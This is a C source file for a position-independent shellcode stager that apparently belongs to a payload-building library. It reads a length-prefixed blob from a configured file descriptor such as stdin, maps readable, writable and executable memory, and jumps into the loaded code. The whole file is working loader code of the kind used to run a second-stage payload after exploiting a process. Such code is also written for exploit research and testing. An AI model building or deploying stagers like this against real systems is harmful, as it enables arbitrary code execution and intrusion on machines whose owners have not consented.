/*
 * stager_fd — file descriptor stager.
 *
 * Reads a length-prefixed payload from a pre-opened file descriptor
 * (typically stdin, fd=0), allocates RWX memory, and jumps to it.
 *
 * Config layout:
 *   +0x00: fd (u32, little-endian)
 *
 * Wire protocol on the fd:
 *   +0x00: payload_size (u32, little-endian)
 *   +0x04: payload_data (payload_size bytes)
 */

#include "picblobs/cache.h"
#include "picblobs/os/linux.h"
#include "picblobs/reloc.h"
#include "picblobs/section.h"
#include "picblobs/sys/close.h"
#include "picblobs/sys/exit_group.h"
#include "picblobs/sys/mmap.h"
#include "picblobs/sys/mprotect.h"
#include "picblobs/sys/read.h"
#include "picblobs/types.h"

__asm__(".section .config,\"aw\"\n"
	".globl stager_fd_config\n"
	"stager_fd_config:\n"
	".space 4\n"
	".previous\n");

PIC_TEXT
static long read_all(int fd, void *buf, pic_size_t count)
{
	pic_u8 *p = (pic_u8 *)buf;
	pic_size_t done = 0;
	while (done < count) {
		long n = pic_read(fd, p + done, count - done);
		if (n <= 0) {
			return -1;
		}
		done += (pic_size_t)n;
	}
	return (long)done;
}

PIC_ENTRY
void _start(void)
{
	PIC_SELF_RELOCATE();

	extern char stager_fd_config[] __attribute__((visibility("hidden")));
	const pic_u8 *cfg = (const pic_u8 *)stager_fd_config;

	/* Read fd number in LE byte order — the blob's config struct is
	 * always little-endian on the wire, independent of target CPU. */
	pic_u32 fd_u = (pic_u32)cfg[0] | ((pic_u32)cfg[1] << 8) |
		((pic_u32)cfg[2] << 16) | ((pic_u32)cfg[3] << 24);
	int fd = (int)fd_u;

	pic_u8 size_buf[4] = {0};
	if (read_all(fd, size_buf, 4) < 0) {
		pic_exit_group(1);
	}
	pic_u32 size = (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
		((pic_u32)size_buf[2] << 16) | ((pic_u32)size_buf[3] << 24);
	if (size == 0 || size > 0x10000000) {
		pic_exit_group(1);
	}

	void *mem = pic_mmap(PIC_NULL, (pic_size_t)size,
		PIC_PROT_READ | PIC_PROT_WRITE | PIC_PROT_EXEC,
		PIC_MAP_PRIVATE | PIC_MAP_ANONYMOUS, -1, 0);
	if ((long)mem == -1) {
		pic_exit_group(1);
	}

	if (read_all(fd, mem, (pic_size_t)size) < 0) {
		pic_exit_group(1);
	}
	pic_sync_icache(mem, (pic_size_t)size);

	/* Leave the fd open — the caller may be reusing it (e.g., stdin).
	 * The kernel will reap it when the process exits. */

#if defined(__thumb__)
	((void (*)(void))((pic_uintptr)mem | 1))();
#else
	((void (*)(void))mem)();
#endif

	pic_exit_group(0);
}
